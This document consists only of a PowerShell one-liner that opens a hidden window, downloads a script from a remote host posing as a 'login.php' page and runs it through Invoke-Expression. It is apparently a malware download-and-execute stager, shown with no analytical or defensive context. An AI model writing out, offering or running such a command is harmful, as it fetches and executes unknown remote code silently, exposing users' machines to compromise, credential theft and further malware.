powershell -w hidden "$f = (New-Object Net.WebClient).DownloadString('https://nikipreter.com:443/login.php');Invoke-Expression $f;"